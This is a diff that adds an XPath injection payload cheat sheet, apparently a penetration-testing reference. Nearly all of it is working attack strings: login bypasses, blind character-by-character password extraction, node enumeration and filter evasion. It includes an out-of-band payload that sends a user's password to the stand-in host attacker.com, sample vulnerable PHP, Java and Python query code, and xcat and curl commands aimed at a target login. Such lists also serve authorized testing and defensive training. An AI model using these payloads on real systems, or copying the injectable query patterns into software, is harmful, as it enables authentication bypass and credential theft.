@@ -1,0 +1,251 @@
+# XPATH Injection Payloads
+
+## ========================================
+## AUTHENTICATION BYPASS
+## ========================================
+
+# Basic bypass
+' or '1'='1
+' or 1=1 or ''='
+' or true() or ''='
+admin' or '1'='1
+') or ('1'='1
+
+# Using OR operator
+' or '1'='1' --
+' or 1=1 --
+' or true() --
+
+# Using AND operator
+admin' and '1'='1
+admin' and 1=1 and ''='
+
+## ========================================
+## BOOLEAN-BASED INJECTION
+## ========================================
+
+# True condition
+' or 1=1 or ''='
+' or true() or ''='
+
+# False condition
+' or 1=2 or ''='
+' or false() or ''='
+
+## ========================================
+## BLIND XPATH INJECTION
+## ========================================
+
+# String length
+' and string-length(//user[1]/password)=5 or ''='
+' and string-length(//user[1]/password)>5 or ''='
+
+# Character extraction
+' and substring(//user[1]/password,1,1)='a' or ''='
+' and substring(//user[1]/password,1,1)='b' or ''='
+
+# Boolean conditions
+' and count(//user)=1 or ''='
+' and count(//user)>1 or ''='
+
+## ========================================
+## DATA EXTRACTION
+## ========================================
+
+# Extract node names
+' or name(/*[1])='root' or ''='
+' or local-name(/*[1])='users' or ''='
+
+# Count nodes
+' or count(/*)>0 or ''='
+' or count(//user)>0 or ''='
+
+# Extract text content
+' or //user[1]/text()='admin' or ''='
+
+## ========================================
+## ENUMERATION
+## ========================================
+
+# Enumerate users
+' or //user[1]/username='admin' or ''='
+' or //user[2]/username='test' or ''='
+' or //user[3]/username='guest' or ''='
+
+# Enumerate attributes
+' or //user[1]/@id='1' or ''='
+' or //user[1]/@role='admin' or ''='
+
+## ========================================
+## XPATH FUNCTIONS
+## ========================================
+
+# String functions
+string-length()
+substring()
+concat()
+contains()
+starts-with()
+normalize-space()
+
+# Numeric functions
+count()
+sum()
+number()
+
+# Boolean functions
+true()
+false()
+not()
+
+# Node functions
+name()
+local-name()
+namespace-uri()
+
+## ========================================
+## ADVANCED TECHNIQUES
+## ========================================
+
+# Using descendant axis
+' or //*/text()='secret' or ''='
+
+# Using parent axis
+' or //../password='secret' or ''='
+
+# Using following-sibling
+' or //username/following-sibling::password='secret' or ''='
+
+# Using preceding-sibling
+' or //password/preceding-sibling::username='admin' or ''='
+
+## ========================================
+## ERROR-BASED INJECTION
+## ========================================
+
+# Trigger errors
+' or 1 div 0 or ''='
+' or doc('invalid') or ''='
+
+## ========================================
+## OUT-OF-BAND (OOB) INJECTION
+## ========================================
+
+# Using doc() function
+' or doc('http://attacker.com/?data='||//user[1]/password) or ''='
+
+## ========================================
+## FILTER BYPASS
+## ========================================
+
+# Case manipulation
+' OR '1'='1
+' Or '1'='1
+' oR '1'='1
+
+# Comment injection
+' or 1=1 #
+' or 1=1 --
+
+# Space alternatives
+'or'1'='1
+'/**/or/**/1=1
+
+## ========================================
+## COMMON INJECTION POINTS
+## ========================================
+
+# Login forms
+username: admin' or '1'='1
+password: anything
+
+username: ' or 1=1 or ''='
+password: ' or 1=1 or ''='
+
+# Search functionality
+search: ' or //user or ''='
+search: ' or true() or ''='
+
+## ========================================
+## PAYLOAD VARIATIONS
+## ========================================
+
+' or '1'='1
+' or 1=1 or ''='
+' or true() or ''='
+admin' or '1'='1
+') or ('1'='1
+' or 'a'='a
+') or 1=1 or ('a'='a
+') or '1'='1' --
+admin') or ('1'='1
+
+## ========================================
+## XPATH 2.0 PAYLOADS
+## ========================================
+
+# Using if-then-else
+' or if(1=1) then true() else false() or ''='
+
+# Using for clause
+' or for $i in 1 to 10 return $i or ''='
+
+## ========================================
+## NODE MANIPULATION
+## ========================================
+
+# Access specific nodes
+//user[1]
+//user[position()=1]
+//user[last()]
+
+# Filter by attribute
+//user[@id='1']
+//user[@role='admin']
+
+# Filter by text
+//user[username='admin']
+//user[contains(username,'adm')]
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Test for injection
+' or '1'='1
+' or 1=1 or ''='
+
+# 2. Determine structure
+' or count(/*)>0 or ''='
+' or name(/*[1])='root' or ''='
+
+# 3. Extract data
+' or //user[1]/username='admin' or ''='
+' or substring(//user[1]/password,1,1)='a' or ''='
+
+## ========================================
+## COMMON VULNERABLE CODE
+## ========================================
+
+# PHP
+$xml = simplexml_load_file('users.xml');
+$result = $xml->xpath("//user[username='$username' and password='$password']");
+
+# Java
+XPathFactory.newInstance().newXPath().compile("//user[username='" + username + "']");
+
+# Python
+tree.xpath("//user[username='" + username + "']")
+
+## ========================================
+## TOOLS
+## ========================================
+
+# xcat - Automated XPath injection
+python xcat.py --url="http://target.com/login" --method=POST --data="username=INJECT_HERE&password=test"
+
+# Burp Suite Intruder
+# Use XPATH injection payloads list
+
+# Manual testing with curl
+curl -X POST http://target.com/login -d "username=' or '1'='1&password=test"
